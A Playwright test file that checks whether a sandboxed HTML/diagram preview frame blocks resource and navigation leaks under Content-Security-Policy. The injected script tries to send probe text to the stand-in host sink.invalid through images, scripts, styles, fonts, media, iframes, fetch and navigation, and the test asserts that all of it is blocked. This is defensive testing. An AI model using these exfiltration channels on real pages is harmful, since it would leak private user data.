import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { expect, test } from '@playwright/test';
import { mermaidDocument } from '@whombat/client';
import { framedPage } from '@whombat/core';
import { contentSecurityPolicy, sandboxContentSecurityPolicy } from '../hosted';

const frameHtml = readFileSync(new URL('../public/sandbox/html-frame.html', import.meta.url), 'utf8');
const frameJs = readFileSync(new URL('../public/sandbox/html-frame.js', import.meta.url), 'utf8');
const runtime = readFileSync(createRequire(import.meta.url).resolve('mermaid/dist/mermaid.min.js'));

for (const dark of [false, true]) {
  test(`preview blocks resource and navigation leaks while drawing offline (${dark ? 'dark' : 'light'})`, async ({
    page,
    context,
  }) => {
    const escaped: string[] = [];
    // Every request is intercepted, including unexpected ones: this test cannot contact an external service.
    await context.route('**/*', async (route) => {
      const url = new URL(route.request().url());
      if (url.href === 'https://preview.test/') {
        await route.fulfill({
          contentType: 'text/html',
          headers: {
            'Content-Security-Policy': contentSecurityPolicy(
              { box: true, controlUrl: url.origin, relayOrigins: [] },
              true,
            ),
          },
          body: '<!doctype html><iframe sandbox="allow-scripts" src="/sandbox/html-frame.html"></iframe>',
        });
      } else if (url.href === 'https://preview.test/sandbox/html-frame.html') {
        await route.fulfill({
          contentType: 'text/html',
          headers: { 'Content-Security-Policy': sandboxContentSecurityPolicy(true) },
          body: frameHtml,
        });
      } else if (url.href === 'https://preview.test/sandbox/html-frame.js') {
        await route.fulfill({ contentType: 'text/javascript', body: frameJs });
      } else {
        escaped.push(url.href);
        await route.abort();
      }
    });
    await page.addInitScript(() => {
      if (window !== top) return;
      Object.assign(window, { ready: false, blockedNavigation: false });
      addEventListener('message', (e) => {
        if (e.data?.type === 'whombat.ready') Object.assign(window, { ready: true });
      });
      addEventListener('securitypolicyviolation', (e) => {
        if (e.effectiveDirective === 'frame-src') Object.assign(window, { blockedNavigation: true });
      });
    });
    await page.goto('https://preview.test/');
    await expect.poll(() => page.evaluate(() => Reflect.get(window, 'ready'))).toBe(true);
    const scriptUrl = `data:application/javascript;base64,${runtime.toString('base64')}`;
    const html = framedPage(
      mermaidDocument('graph LR; Brief --> Logo', scriptUrl, {
        dark,
        background: dark ? '#151515' : '#ffffff',
        node: '#999999',
        text: '#333333',
        line: '#777777',
        accent: '#555555',
        secondary: '#aaaaaa',
        font: 'sans-serif',
      }).replace(
        '</body>',
        `<img id="embedded" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
      <p id="probe">synthetic private content</p><script>
      window.blocked = [];
      document.addEventListener('securitypolicyviolation', e => blocked.push(e.effectiveDirective));
      const sink = 'https://sink.invalid/' + document.getElementById('probe').textContent;
      new Image().src = sink + '/image';
      const s = document.createElement('script'); s.src = sink + '/script'; document.head.append(s);
      const l = document.createElement('link'); l.rel='stylesheet'; l.href=sink + '/style'; document.head.append(l);
      const st = document.createElement('style');
      st.textContent = '@font-face{font-family:leak;src:url("'+sink+'/font")}#probe{font-family:leak;background-image:url("'+sink+'/css-image")}';
      document.head.append(st);
      const v = document.createElement('video'); v.src=sink+'/media'; v.preload='auto'; document.body.append(v); v.load();
      const f = document.createElement('iframe'); f.src=sink+'/frame'; document.body.append(f);
      fetch(sink+'/fetch').catch(() => {});
      document.getElementById('probe').dataset.inline = 'ran';
      </script></body>`,
      ),
    );
    await page.evaluate(
      (html) =>
        document.querySelector('iframe')?.contentWindow?.postMessage({ type: 'whombat.html', html }, '*'),
      html,
    );
    const frame = page.frameLocator('iframe').first();
    await expect(frame.locator('#probe')).toHaveAttribute('data-inline', 'ran');
    await expect(frame.locator('#diagram svg')).toBeVisible();
    expect(await frame.locator('#embedded').evaluate((img) => (img as HTMLImageElement).naturalWidth)).toBe(
      1,
    );
    const child = page.frames().find((f) => f.url().endsWith('/sandbox/html-frame.html'));
    if (!child) throw new Error('missing preview frame');
    await expect
      .poll(() => child.evaluate(() => Reflect.get(window, 'blocked')))
      .toEqual(
        expect.arrayContaining([
          'img-src',
          'script-src-elem',
          'style-src-elem',
          'font-src',
          'media-src',
          'frame-src',
          'connect-src',
        ]),
      );
    await child.evaluate(() => {
      location.href = 'https://sink.invalid/navigation?synthetic=private';
    });
    await expect.poll(() => page.evaluate(() => Reflect.get(window, 'blockedNavigation'))).toBe(true);
    expect(escaped).toEqual([]);
  });
}
